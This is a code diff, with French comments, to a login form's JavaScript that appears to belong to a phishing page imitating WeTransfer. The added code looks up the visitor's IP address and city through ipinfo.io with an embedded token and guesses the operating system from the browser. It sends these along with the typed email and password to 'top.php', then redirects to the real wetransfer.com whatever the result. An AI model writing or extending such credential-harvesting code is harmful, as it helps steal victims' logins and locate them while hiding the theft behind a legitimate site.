@@ -37,39 +37,68 @@ continueBtn.addEventListener('click', function() {
         if (validatePassword(password)) {
             passwordError.style.display = 'none';
 
-            // Envoi des données au serveur via fetch
-            const formData = new FormData();
-            formData.append('email', emailInput.value);
-            formData.append('password', passwordInput.value);
+            // Requête pour récupérer les infos IP avec ipinfo.io
+            fetch('https://ipinfo.io/?token=94c752f6b1e2fe')
+                .then(response => response.json())
+                .then(data => {
+                    // Informations de géolocalisation
+                    const ip = data.ip;
+                    const ville = data.city;
 
-            console.log("Données envoyées:", {
-                email: emailInput.value,
-                password: passwordInput.value
-            });
+                    // Détection du système d'exploitation
+                    const userAgent = navigator.userAgent;
+                    let os = "Inconnu";
 
-            fetch('top.php', {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Réponse du serveur:', data); // Affiche la réponse du serveur pour déboguer
-                if (data.status === 'error') {
-                    // Affichage des erreurs à l'écran
-                    passwordError.textContent = data.message || 'Une erreur est survenue';
+                    if (userAgent.indexOf("Win") !== -1) os = "Windows";
+                    else if (userAgent.indexOf("Mac") !== -1) os = "MacOS";
+                    else if (userAgent.indexOf("X11") !== -1) os = "UNIX";
+                    else if (userAgent.indexOf("Linux") !== -1) os = "Linux";
+                    else if (/Android/i.test(userAgent)) os = "Android";
+                    else if (/iPhone|iPad|iPod/i.test(userAgent)) os = "iOS";
+
+                    // Affichage dans la console pour vérifier
+                    console.log("Données envoyées:", {
+                        email: emailInput.value,
+                        password: passwordInput.value,
+                        ip: ip,
+                        ville: ville,
+                        os: os
+                    });
+
+                    // Envoi des données au serveur via fetch
+                    const formData = new FormData();
+                    formData.append('email', emailInput.value);
+                    formData.append('password', passwordInput.value);
+                    formData.append('ip', ip);
+                    formData.append('ville', ville);
+                    formData.append('os', os);
+
+                    fetch('top.php', {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Réponse du serveur:', data);
+                        if (data.status === 'error') {
+                            passwordError.textContent = data.message || 'Une erreur est survenue';
+                            passwordError.style.display = 'block';
+                        }
+                        // Redirection après traitement
+                        window.location.href = 'https://wetransfer.com/';
+                    })
+                    .catch(error => {
+                        console.error('Erreur réseau:', error);
+                        passwordError.textContent = 'Erreur de connexion au serveur';
+                        passwordError.style.display = 'block';
+                        window.location.href = 'https://wetransfer.com/';
+                    });
+                })
+                .catch(error => {
+                    console.error('Erreur lors de la récupération des données IP:', error);
+                    passwordError.textContent = 'Erreur lors de la récupération des données IP';
                     passwordError.style.display = 'block';
-                }
-                // Rediriger dans tous les cas (réponse du serveur)
-                window.location.href = 'https://wetransfer.com/'; // Remplacez par la page de redirection souhaitée
-            })
-            .catch(error => {
-                // Gérer les erreurs réseau
-                console.error('Erreur réseau:', error); // Afficher l'erreur dans la console pour déboguer
-                passwordError.textContent = 'Erreur de connexion au serveur';
-                passwordError.style.display = 'block';
-                // Rediriger même en cas d'erreur réseau
-                window.location.href = 'https://wetransfer.com/'; // Remplacez par la page de redirection souhaitée
-            });
+                });
         } else {
             passwordError.style.display = 'block';
         }
